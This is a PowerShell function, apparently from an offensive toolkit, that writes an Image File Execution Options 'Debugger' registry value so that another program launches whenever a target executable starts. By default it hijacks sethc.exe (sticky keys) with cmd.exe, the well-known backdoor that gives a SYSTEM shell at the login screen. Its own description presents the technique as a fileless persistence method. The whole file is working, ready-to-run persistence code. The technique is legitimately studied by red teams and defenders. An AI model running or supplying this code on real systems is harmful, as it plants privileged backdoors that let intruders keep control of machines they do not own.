
Function Set-ImageFileExecutionOptionDebugger()
{
<#

.SYNOPSIS
    Set a debugger to be launched when a target executable is launched.
    
.DESCRIPTION
    The intention of creating the IFEO registry key is to give developers the option to debug their software by attaching any program to any executable 
    using a registry key. The debugger will be launched with SYSTEM priviledges. This leads to a simple, high-priviledge, and fileless persistence method.
    
.PARAMETER Executable
    The executable filename to setup a debugger on.

.PARAMETER Debugger
    The "debugger" binary to launch when the target executable is loaded.

.EXAMPLE
    Set-ImageFileExecutionOptionDebugger -Executable "Magnify.exe" -Debugger "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
.LINK
    https://blog.malwarebytes.com/101/2015/12/an-introduction-to-image-file-execution-options/

.NOTES
    Requires administrator priviledges. If no -Executable provided, default to sethc.exe. If no -Debugger provided default to C:\Windows\System32\cmd.exe.

#>

    Param(
        [Parameter(Mandatory=$False, Position=0)]
        [String] $Executable = "sethc.exe",

        [Parameter(Mandatory=$False, Position=1)]
        [String] $Debugger = "C:\Windows\System32\cmd.exe"       
    )

    [String] $IFEOPath = ("HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{0}" -f $Executable)

    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] “Administrator”))
    {
        If (-Not (Test-Path -Path $IFEOPath))
        {
            New-Item -Path $IFEOPath -ErrorAction 'SilentlyContinue' | Out-Null
        }

        Try
        {
            Get-ItemProperty -Path $IFEOPath -Name 'Debugger' -ErrorAction 'Stop' | Out-Null
        }
        Catch [System.Management.Automation.ItemNotFoundException]
        {
            New-ItemProperty -Path $IFEOPath -Name 'Debugger' -Value $Debugger -PropertyType 'String' -Force | Out-Null
        }
    }
}